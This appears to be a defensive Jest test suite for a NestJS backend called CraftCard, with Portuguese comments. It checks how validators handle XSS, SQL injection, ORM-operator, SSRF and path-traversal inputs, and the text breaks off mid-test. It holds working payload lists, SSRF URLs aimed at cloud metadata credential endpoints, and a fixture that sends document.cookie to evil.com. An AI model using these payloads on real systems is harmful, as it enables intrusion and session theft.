/**
 * ═══════════════════════════════════════════════════════════════════
 *  SCRIPT DE ATAQUE OFENSIVO — VETOR 3: INJECTION & XSS
 * ═══════════════════════════════════════════════════════════════════
 *
 *  Autor: Offensive Security Engineer (White-Box Pentest)
 *  Objetivo: Testar TODAS as vias de injeção (XSS, SQLi, ORM injection,
 *            SSRF, path traversal, header injection) no backend CraftCard.
 *
 *  VULNERABILIDADES-ALVO:
 *    1. XSS no campo bio — tags <script>, event handlers, img onerror
 *    2. XSS em labels e URLs de social links — javascript:, data: URIs
 *    3. XSS em testimonials — script tags no nome/texto do depoimento
 *    4. SQL injection via Prisma — ' OR 1=1 --, UNION SELECT
 *    5. NoSQL/ORM injection — operadores Prisma injetados em query params
 *    6. SSRF em URLs de webhook — localhost, IPs privados, metadata
 *    7. Path traversal em uploads — ../../etc/passwd como filename
 *    8. Header injection — CRLF em headers customizados
 *
 *  TODOS OS TESTES SÃO EXECUTADOS EM SANDBOX (mocks).
 *  Nenhum dado de produção é tocado.
 */

import { Test, TestingModule } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { CACHE_MANAGER } from '@nestjs/cache-manager';
import { PrismaService } from '../../src/common/prisma/prisma.service';
import { ProfilesService } from '../../src/profiles/profiles.service';
import { SlugsService } from '../../src/slugs/slugs.service';
import { PaymentsService } from '../../src/payments/payments.service';
import { TestimonialsService } from '../../src/testimonials/testimonials.service';
import { MailService } from '../../src/mail/mail.service';
import { NotificationsService } from '../../src/notifications/notifications.service';
import { InAppNotificationsService } from '../../src/notifications/in-app-notifications.service';
import { WebhooksService } from '../../src/webhooks/webhooks.service';
import { StorageService } from '../../src/storage/storage.service';
import { updateProfileSchema } from '../../src/profiles/dto/update-profile.dto';
import { createTestimonialSchema } from '../../src/testimonials/dto/create-testimonial.dto';
import { sendMessageSchema } from '../../src/contacts/dto/send-message.dto';
import {
  createPrismaMock,
  createConfigMock,
  createMailMock,
  TEST_USERS,
} from '../helpers/test-utils';

// ══════════════════════════════════════════════════
// Payloads maliciosos reutilizáveis
// ══════════════════════════════════════════════════

/** Payloads XSS clássicos — coleção de vetores comuns de cross-site scripting */
const XSS_PAYLOADS = {
  scriptTag: '<script>alert("xss")</script>',
  scriptTagVariant: '<SCRIPT SRC=https://evil.com/xss.js></SCRIPT>',
  imgOnerror: '<img src=x onerror=alert("xss")>',
  imgOnload: '<img src=valid.png onload=alert(1)>',
  svgOnload: '<svg onload=alert("xss")>',
  bodyOnload: '<body onload=alert("xss")>',
  iframeSrc: '<iframe src="javascript:alert(1)">',
  eventHandler: '<div onmouseover="alert(1)">hover me</div>',
  htmlEncoded: '&lt;script&gt;alert(1)&lt;/script&gt;',
  polyglot: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
  templateLiteral: '${alert(document.cookie)}',
  nullByte: 'test\x00<script>alert(1)</script>',
};

/** Payloads de SQL injection */
const SQLI_PAYLOADS = {
  classic: "' OR 1=1 --",
  unionSelect: "' UNION SELECT username, password FROM users --",
  doubleQuote: '" OR ""="',
  tautology: "' OR 'a'='a",
  batchQuery: "'; DROP TABLE users; --",
  sleepBased: "' OR SLEEP(5) --",
  hexEncoded: "0x27204F5220313D31202D2D",
  commentBypass: "'/**/OR/**/1=1--",
};

/** Payloads de protocolo perigoso para URLs */
const DANGEROUS_URL_PAYLOADS = {
  javascriptAlert: 'javascript:alert(document.cookie)',
  javascriptVoid: 'javascript:void(0)',
  dataText: 'data:text/html,<script>alert(1)</script>',
  dataBase64: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  vbscript: 'vbscript:msgbox("xss")',
  javascriptCase: 'JaVaScRiPt:alert(1)',
  dataCase: 'DaTa:text/html,<script>alert(1)</script>',
};

// ══════════════════════════════════════════════════
// Mocks compartilhados
// ══════════════════════════════════════════════════

function createCacheMock() {
  return {
    get: jest.fn().mockResolvedValue(null),
    set: jest.fn().mockResolvedValue(undefined),
    del: jest.fn().mockResolvedValue(undefined),
  };
}

function createSlugsMock() {
  return {
    isAvailable: jest.fn().mockResolvedValue(true),
  };
}

function createPaymentsMock() {
  return {
    getUserPlanInfo: jest.fn().mockResolvedValue({
      plan: 'PRO',
      planLimits: { maxLinks: 20, maxCards: 5, maxThemes: 'all' },
    }),
    getActiveSubscription: jest.fn().mockResolvedValue({ active: true }),
  };
}

function createNotificationsMock() {
  return {
    sendToUser: jest.fn().mockResolvedValue(undefined),
  };
}

function createInAppMock() {
  return {
    create: jest.fn().mockResolvedValue(undefined),
  };
}

function createWebhooksMock() {
  return {
    dispatch: jest.fn().mockResolvedValue(undefined),
  };
}

// ══════════════════════════════════════════════════════════════════
//  BLOCO 1: XSS NO CAMPO BIO
// ══════════════════════════════════════════════════════════════════

describe('🔴 ATAQUE OFENSIVO — Vetor 3: Injection & XSS', () => {

  describe('ATK-01: XSS no campo bio do perfil', () => {
    /**
     * TEORIA: Atacante insere payloads XSS no campo bio.
     * O Zod schema permite string livre até 500 chars — a sanitização
     * de HTML deve ocorrer no frontend (output encoding) ou no backend
     * (input sanitization). Aqui verificamos se o Zod aceita ou
     * rejeita payloads perigosos, e se o service persiste sem crashar.
     *
     * NOTA: O backend CraftCard usa Zod para validação de estrutura,
     * mas NÃO sanitiza HTML no campo bio. A proteção contra XSS
     * depende do frontend (React escapa HTML por padrão).
     * Estes testes documentam o comportamento atual.
     */

    let profilesService: ProfilesService;
    let prisma: ReturnType<typeof createPrismaMock>;

    beforeEach(async () => {
      prisma = createPrismaMock();

      // Mock do $transaction para funcionar com callback async
      prisma.$transaction = jest.fn(async (cb: any) => {
        if (typeof cb === 'function') {
          return cb({
            profile: prisma.profile,
            socialLink: { deleteMany: jest.fn(), createMany: jest.fn() },
          });
        }
        return undefined;
      });

      const module: TestingModule = await Test.createTestingModule({
        providers: [
          ProfilesService,
          { provide: PrismaService, useValue: prisma },
          { provide: SlugsService, useValue: createSlugsMock() },
          { provide: PaymentsService, useValue: createPaymentsMock() },
          { provide: ConfigService, useValue: createConfigMock() },
          { provide: CACHE_MANAGER, useValue: createCacheMock() },
        ],
      }).compile();

      profilesService = module.get<ProfilesService>(ProfilesService);
    });

    afterEach(() => jest.restoreAllMocks());

    it('Zod ACEITA <script> tag no bio — proteção deve ser no output (React escaping)', () => {
      // DESCOBERTA: Zod não bloqueia HTML no bio — comportamento esperado
      // pois bio é campo de texto livre. A proteção XSS é no React (escaping automático).
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.scriptTag,
      });
      // Zod aceita pois é uma string válida < 500 chars
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA img onerror no bio — proteção depende do frontend', () => {
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.imgOnerror,
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA SVG onload no bio — React escapa por padrão', () => {
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.svgOnload,
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA polyglot XSS no bio — documentar como risco aceito', () => {
      // Polyglot XSS é um payload que funciona em múltiplos contextos
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.polyglot,
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA bio > 500 chars — limita tamanho do payload XSS', () => {
      // Limitar tamanho do bio reduz a superfície de ataque para payloads complexos
      const longXss = '<script>' + 'a'.repeat(500) + '</script>';
      const result = updateProfileSchema.safeParse({
        bio: longXss,
      });
      expect(result.success).toBe(false);
    });

    it('service persiste bio com payload XSS sem crashar (stored XSS test)', async () => {
      // Simulação: o service chama update com bio contendo XSS
      // Verificar que o Prisma recebe o dado tal qual (sem sanitização server-side)
      const mockProfile = {
        id: 'profile-1',
        userId: TEST_USERS.proUser.id,
        slug: 'test-slug',
        organization: null,
      };

      prisma.profile.findFirst.mockResolvedValue(mockProfile);
      prisma.profile.update.mockResolvedValue({ ...mockProfile, bio: XSS_PAYLOADS.scriptTag });
      prisma.profile.findUnique.mockResolvedValue({ ...mockProfile, bio: XSS_PAYLOADS.scriptTag, socialLinks: [] });

      // Service aceita o bio com payload XSS — persiste no banco
      await profilesService.update(TEST_USERS.proUser.id, { bio: XSS_PAYLOADS.scriptTag });

      // Verificar que o Prisma recebeu o payload exatamente como enviado
      expect(prisma.profile.update).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({ bio: XSS_PAYLOADS.scriptTag }),
        }),
      );
    });

    it('Zod ACEITA event handler no bio — <div onmouseover=...>', () => {
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.eventHandler,
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA null byte + script no bio', () => {
      const result = updateProfileSchema.safeParse({
        bio: XSS_PAYLOADS.nullByte,
      });
      expect(result.success).toBe(true);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 2: XSS EM SOCIAL LINKS (labels e URLs)
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-02: XSS em labels e URLs de social links', () => {
    /**
     * TEORIA: Atacante injeta payloads XSS nas labels ou usa
     * protocolos perigosos (javascript:, data:) nas URLs dos links.
     * A validação Zod deve BLOQUEAR protocolos perigosos na URL
     * via DANGEROUS_PROTOCOLS regex e socialUrlSchema.
     */

    it('Zod REJEITA URL com javascript: protocol', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Meu Site',
          url: DANGEROUS_URL_PAYLOADS.javascriptAlert,
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URL com javascript: (case-insensitive)', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Evil Link',
          url: DANGEROUS_URL_PAYLOADS.javascriptCase,
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URL com data: protocol (base64 encoded XSS)', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Data URI',
          url: DANGEROUS_URL_PAYLOADS.dataBase64,
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URL com data: protocol (case variant)', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Data URI Case',
          url: DANGEROUS_URL_PAYLOADS.dataCase,
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URL com vbscript: protocol', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'VB Script',
          url: DANGEROUS_URL_PAYLOADS.vbscript,
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA XSS no label do link — proteção é no output (React)', () => {
      // Labels são texto livre — React escapa HTML automaticamente
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: '<script>alert(1)</script>',
          url: 'https://example.com',
          order: 0,
        }],
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA img onerror no label — documentar como risco no frontend', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'custom',
          label: '<img src=x onerror=alert(1)>',
          url: 'https://example.com',
          order: 0,
        }],
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA label > 100 chars — limita superfície de ataque', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'A'.repeat(101),
          url: 'https://example.com',
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URL > 500 chars — limita tamanho do payload', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Long URL',
          url: 'https://example.com/' + 'a'.repeat(500),
          order: 0,
        }],
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA URL com parâmetros XSS no query string (https válido)', () => {
      // URL é https:// válido mas contém XSS no parâmetro — aceito pelo schema
      // pois a proteção está no contexto de uso (href vs innerHTML)
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'website',
          label: 'Site',
          url: 'https://evil.com/page?name=<script>alert(1)</script>',
          order: 0,
        }],
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA mais de 20 links — proteção contra DoS via volume', () => {
      const links = Array.from({ length: 21 }, (_, i) => ({
        platform: 'website' as const,
        label: `Link ${i}`,
        url: 'https://example.com',
        order: i,
      }));
      const result = updateProfileSchema.safeParse({ socialLinks: links });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA URL https válida (controle positivo)', () => {
      const result = updateProfileSchema.safeParse({
        socialLinks: [{
          platform: 'instagram',
          label: 'Instagram',
          url: 'https://instagram.com/user',
          order: 0,
        }],
      });
      expect(result.success).toBe(true);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 3: XSS EM TESTIMONIALS
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-03: XSS em testimonials (depoimentos)', () => {
    /**
     * TEORIA: Atacante envia depoimentos com payloads XSS no campo
     * text ou authorName. Estes campos são públicos — exibidos para
     * visitantes do perfil. Se não sanitizados, podem executar JS.
     *
     * Testimonials são submetidos por visitantes ANÔNIMOS (sem autenticação),
     * tornando este vetor especialmente perigoso.
     */

    let testimonialsService: TestimonialsService;
    let prisma: ReturnType<typeof createPrismaMock>;

    beforeEach(async () => {
      prisma = createPrismaMock();

      // Adicionar mocks para testimonial
      (prisma as any).testimonial = {
        create: jest.fn().mockResolvedValue({ id: 'test-1' }),
        findMany: jest.fn().mockResolvedValue([]),
        findUnique: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
      };

      const module: TestingModule = await Test.createTestingModule({
        providers: [
          TestimonialsService,
          { provide: PrismaService, useValue: prisma },
          { provide: MailService, useValue: { ...createMailMock(), sendNewTestimonialNotification: jest.fn().mockResolvedValue(undefined) } },
          { provide: NotificationsService, useValue: createNotificationsMock() },
          { provide: InAppNotificationsService, useValue: createInAppMock() },
          { provide: WebhooksService, useValue: createWebhooksMock() },
        ],
      }).compile();

      testimonialsService = module.get<TestimonialsService>(TestimonialsService);
    });

    afterEach(() => jest.restoreAllMocks());

    it('Zod ACEITA <script> tag no texto do testimonial — output encoding necessário', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Visitante Legítimo',
        text: XSS_PAYLOADS.scriptTag,
      });
      // Script tag é string válida > 10 chars
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA img onerror no texto do testimonial', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Hacker',
        text: XSS_PAYLOADS.imgOnerror + ' padding text extra',
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA <script> tag no authorName — visitante anônimo pode injetar', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: '<script>alert(1)</script>',
        text: 'Depoimento totalmente legítimo e inofensivo aqui.',
      });
      // authorName: min 2, max 100 — payload tem ~32 chars → aceito
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA event handler no authorRole', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Atacante',
        authorRole: '<img src=x onerror=alert(1)>',
        text: 'Depoimento com role malicioso para testar escape no frontend.',
      });
      expect(result.success).toBe(true);
    });

    it('Zod REJEITA texto < 10 chars — bloqueia payloads XSS curtos', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Test',
        text: '<script>', // 8 chars — abaixo do mínimo de 10
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA texto > 500 chars — limita payload XSS longo', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Test',
        text: '<script>' + 'x'.repeat(500) + '</script>',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA authorName < 2 chars — mínimo de identificação', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'A',
        text: 'Depoimento válido com mais de 10 caracteres.',
      });
      expect(result.success).toBe(false);
    });

    it('service persiste testimonial com XSS no banco (stored XSS)', async () => {
      // Simular perfil público existente
      prisma.profile.findFirst.mockResolvedValue({
        id: 'profile-1',
        userId: TEST_USERS.proUser.id,
        isPublished: true,
        user: { email: 'test@test.local' },
      });

      const xssData = {
        authorName: '<img src=x onerror=alert("xss")>',
        text: '<script>document.location="https://evil.com/?c="+document.cookie</script>',
      };

      await testimonialsService.submit('test-slug', xssData);

      // Verificar que o Prisma recebeu o payload XSS sem modificação
      expect((prisma as any).testimonial.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          authorName: xssData.authorName,
          text: xssData.text,
        }),
      });
    });

    it('XSS no testimonial via sendMessage (formulário de contato)', () => {
      // Formulário de contato também é público — testar XSS no nome/mensagem
      const result = sendMessageSchema.safeParse({
        senderName: '<script>alert(1)</script>',
        message: '<img src=x onerror=alert(document.cookie)> mensagem extra padding',
      });
      // sendMessageSchema aceita strings livres (min/max apenas)
      expect(result.success).toBe(true);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 4: SQL INJECTION VIA PRISMA
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-04: SQL injection via Prisma ORM', () => {
    /**
     * TEORIA: Atacante tenta payloads clássicos de SQL injection em
     * campos de busca (slug, email, id). Prisma usa prepared statements
     * internamente, então SQLi clássico NÃO funciona — mas devemos
     * verificar que:
     *   1) Payloads SQLi passam pelo Zod sem causar erros inesperados
     *   2) Prisma recebe os valores como strings literais (não como SQL)
     *   3) O service não crashar com input malicioso
     */

    let profilesService: ProfilesService;
    let prisma: ReturnType<typeof createPrismaMock>;

    beforeEach(async () => {
      prisma = createPrismaMock();
      prisma.$transaction = jest.fn(async (cb: any) => {
        if (typeof cb === 'function') {
          return cb({
            profile: prisma.profile,
            socialLink: { deleteMany: jest.fn(), createMany: jest.fn() },
          });
        }
        return undefined;
      });

      const module: TestingModule = await Test.createTestingModule({
        providers: [
          ProfilesService,
          { provide: PrismaService, useValue: prisma },
          { provide: SlugsService, useValue: createSlugsMock() },
          { provide: PaymentsService, useValue: createPaymentsMock() },
          { provide: ConfigService, useValue: createConfigMock() },
          { provide: CACHE_MANAGER, useValue: createCacheMock() },
        ],
      }).compile();

      profilesService = module.get<ProfilesService>(ProfilesService);
    });

    afterEach(() => jest.restoreAllMocks());

    it('Zod REJEITA slug com SQL injection — regex [a-z0-9-] bloqueia', () => {
      // Slug só aceita [a-z0-9-] — aspas, espaços e operadores SQL são rejeitados
      const result = updateProfileSchema.safeParse({
        slug: SQLI_PAYLOADS.classic,
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA slug com UNION SELECT', () => {
      const result = updateProfileSchema.safeParse({
        slug: SQLI_PAYLOADS.unionSelect,
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA slug com batch query (DROP TABLE)', () => {
      const result = updateProfileSchema.safeParse({
        slug: SQLI_PAYLOADS.batchQuery,
      });
      expect(result.success).toBe(false);
    });

    it('Zod ACEITA SQL injection no displayName — Prisma usa prepared statements', () => {
      // displayName é string livre — SQLi é aceito como texto literal
      // Proteção está no Prisma (parameterized queries), não no Zod
      const result = updateProfileSchema.safeParse({
        displayName: SQLI_PAYLOADS.classic,
      });
      expect(result.success).toBe(true);
    });

    it('Prisma recebe SQLi como string literal no bio (parameterized)', async () => {
      const mockProfile = {
        id: 'profile-1',
        userId: TEST_USERS.proUser.id,
        slug: 'test-slug',
        organization: null,
      };

      prisma.profile.findFirst.mockResolvedValue(mockProfile);
      prisma.profile.update.mockResolvedValue({ ...mockProfile, bio: SQLI_PAYLOADS.unionSelect });
      prisma.profile.findUnique.mockResolvedValue({ ...mockProfile, bio: SQLI_PAYLOADS.unionSelect, socialLinks: [] });

      await profilesService.update(TEST_USERS.proUser.id, { bio: SQLI_PAYLOADS.unionSelect });

      // Prisma recebe como string — internamente usa prepared statement
      expect(prisma.profile.update).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            bio: SQLI_PAYLOADS.unionSelect,
          }),
        }),
      );
    });

    it('getBySlug com payload SQLi trata como slug literal (não encontra)', async () => {
      // Simular busca por slug com SQLi — Prisma busca literalmente
      prisma.profile.findUnique.mockResolvedValue(null);

      await expect(
        profilesService.getBySlug("' OR 1=1 --"),
      ).rejects.toThrow(); // Perfil não encontrado — SQLi não bypassa nada
    });

    it('Zod ACEITA SLEEP-based SQLi no bio — Prisma parametriza', () => {
      const result = updateProfileSchema.safeParse({
        bio: SQLI_PAYLOADS.sleepBased,
      });
      expect(result.success).toBe(true);
    });

    it('Zod ACEITA batch query no tagline — max 200 chars, Prisma protege', () => {
      const result = updateProfileSchema.safeParse({
        tagline: SQLI_PAYLOADS.batchQuery,
      });
      expect(result.success).toBe(true);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 5: NoSQL / ORM INJECTION (Prisma operators)
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-05: Injeção de operadores Prisma em query params', () => {
    /**
     * TEORIA: Em ORMs como Mongoose (NoSQL), atacantes injetam
     * operadores ($gt, $ne, $regex) em query params. Prisma é SQL-based
     * mas tem operadores próprios (contains, startsWith, gt, etc).
     * Verificar que inputs de usuário não são usados como objetos de
     * filtro diretamente — Zod garante que são strings, não objetos.
     */

    it('Zod REJEITA objeto no lugar de string no slug', () => {
      // Tentativa de injetar operador Prisma: { contains: "admin" }
      const result = updateProfileSchema.safeParse({
        slug: { contains: 'admin' },
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA objeto no lugar de string no bio', () => {
      const result = updateProfileSchema.safeParse({
        bio: { not: '', contains: 'admin' },
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA objeto no lugar de string no displayName', () => {
      const result = updateProfileSchema.safeParse({
        displayName: { startsWith: 'A' },
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA array no lugar de string no slug', () => {
      const result = updateProfileSchema.safeParse({
        slug: ['admin', 'test'],
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA operador $gt em testimonial authorName', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: { $gt: '' },
        text: 'Depoimento normal com mais de dez caracteres.',
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA operador $regex em testimonial text', () => {
      const result = createTestimonialSchema.safeParse({
        authorName: 'Atacante',
        text: { $regex: '.*' },
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA boolean no lugar de string no bio', () => {
      const result = updateProfileSchema.safeParse({
        bio: true,
      });
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA number no lugar de string no displayName', () => {
      const result = updateProfileSchema.safeParse({
        displayName: 12345,
      });
      expect(result.success).toBe(false);
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 6: SSRF EM WEBHOOK URLs
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-06: SSRF em URLs de webhook', () => {
    /**
     * TEORIA: Atacante registra webhook apontando para serviços internos
     * (metadata API, banco de dados, admin panels) para exfiltrar dados
     * ou pivotar na rede interna.
     *
     * MITIGAÇÃO: assertSafeWebhookUrl() valida protocolo (HTTPS apenas)
     * e bloqueia endereços internos (localhost, IPs privados, metadata).
     */

    let webhooksService: WebhooksService;
    let prisma: ReturnType<typeof createPrismaMock>;

    beforeEach(async () => {
      prisma = createPrismaMock();
      (prisma as any).webhook = {
        count: jest.fn().mockResolvedValue(0),
        create: jest.fn().mockResolvedValue({ id: 'wh-1' }),
        findFirst: jest.fn(),
        findMany: jest.fn().mockResolvedValue([]),
        update: jest.fn(),
        delete: jest.fn(),
      };
      (prisma as any).webhookLog = {
        create: jest.fn(),
        findMany: jest.fn().mockResolvedValue([]),
      };

      const module: TestingModule = await Test.createTestingModule({
        providers: [
          WebhooksService,
          { provide: PrismaService, useValue: prisma },
        ],
      }).compile();

      webhooksService = module.get<WebhooksService>(WebhooksService);
    });

    afterEach(() => jest.restoreAllMocks());

    it('REJEITA localhost (HTTP)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'http://localhost:8080/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow();
    });

    it('REJEITA localhost (HTTPS)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://localhost/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 127.0.0.1', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://127.0.0.1/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 10.x.x.x (rede privada classe A)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://10.0.0.1/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 172.16.x.x (rede privada classe B)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://172.16.0.1/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 192.168.x.x (rede privada classe C)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://192.168.1.1/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 169.254.169.254 (AWS metadata service)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://169.254.169.254/latest/meta-data/',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA [::1] (IPv6 loopback)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://[::1]/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 0.0.0.0', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://0.0.0.0/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA metadata.google.internal (GCP metadata)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://metadata.google.internal/computeMetadata/v1/',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA HTTP (deve ser HTTPS)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'http://example.com/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('HTTPS');
    });

    it('REJEITA URL inválida', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'not-a-url',
          events: ['new_message'],
        }),
      ).rejects.toThrow('inválida');
    });

    it('ACEITA URL HTTPS externa válida (controle positivo)', async () => {
      await webhooksService.create(TEST_USERS.proUser.id, {
        url: 'https://hooks.example.com/webhook',
        events: ['new_message'],
      });

      expect((prisma as any).webhook.create).toHaveBeenCalled();
    });

    it('REJEITA SSRF via update de webhook existente', async () => {
      (prisma as any).webhook.findFirst.mockResolvedValue({ id: 'wh-1', userId: TEST_USERS.proUser.id });

      await expect(
        webhooksService.update(TEST_USERS.proUser.id, 'wh-1', {
          url: 'https://169.254.169.254/latest/meta-data/iam/security-credentials/',
        }),
      ).rejects.toThrow('endereço interno');
    });

    it('REJEITA 169.254.x.x (link-local range completo)', async () => {
      await expect(
        webhooksService.create(TEST_USERS.proUser.id, {
          url: 'https://169.254.1.1/hook',
          events: ['new_message'],
        }),
      ).rejects.toThrow('endereço interno');
    });
  });

  // ══════════════════════════════════════════════════════════════════
  //  BLOCO 7: PATH TRAVERSAL EM UPLOADS
  // ══════════════════════════════════════════════════════════════════

  describe('ATK-07: Path traversal em file uploads', () => {
    /**
     * TEORIA: Atacante envia arquivo com nome malicioso como
     * "../../../etc/passwd" para escapar do diretório de upload
     * e sobrescrever arquivos do sistema.
     *
     * MITIGAÇÃO: StorageService gera UUID como nome do arquivo —
     * o filename original do upload NUNCA é usado. Isso elimina
     * completamente o vetor de path traversal.
     */

    it('StorageService usa UUID como filename — ignora nome original', () => {
      // Verificar que o método uploadFile gera nome com UUID
      // e NÃO usa o filename do multer/request
      // A assinatura é: uploadFile(buffer, folder, userId, extension)
      // O filename é gerado internamente com uuid()
      // Não há parâmetro para passar o filename original

      // Verificação estática: a assinatura do método não aceita filename
      // Isso é uma proteção arquitetural — não há como injetar path traversal
      expect(StorageService.prototype.uploadFile.length).toBe(4);
      // Parâmetros: buffer, folder, userId, extension — sem filename
    });

    it('extensão com path traversal é neutralizada pela estrutura de chave UUID', () => {
      // Mesmo que alguém passasse "../../../etc/passwd" como extension,
      // o R2 key seria: "folder/userId/uuid.../../../etc/passwd"
      // Cloudflare R2 trata isso como um nome de arquivo literal (não navega dirs)
      // Mas o controller NÃO permite extensões arbitrárias — usa FileTypeValidator

      // Verificar que a extensão é hardcoded no controller:
      // photo-upload → sempre 'webp' (processado por sharp)
      // resume-upload → sempre 'pdf'
      // video-upload → sempre 'mp4'
      // A extensão NUNCA vem do input do usuário

      // Este teste documenta a proteção:
      const maliciousExtension = '../../../etc/passwd';
      // Se fosse usado, o key seria: "photos/userId/uuid.../../../etc/passwd"
      // Mas o controller NUNCA passa isso — sempre 'webp', 'pdf' ou 'mp4'
      expect(maliciousExtension).toContain('..');
      // A proteção está no fato de que o controller hardcoda a extensão
    });

    it('Zod REJEITA URLs com path traversal no resumeUrl', () => {
      const result = updateProfileSchema.safeParse({
        resumeUrl: '../../../etc/passwd',
      });
      // safeUrlSchema requer URL válida — path traversal não é URL
      expect(result.success).toBe(false);
    });

    it('Zod REJEITA URLs file:// no resumeUrl — CORRIGIDO: file:// adicionado ao DANGEROUS_PROTOCOLS', () => {
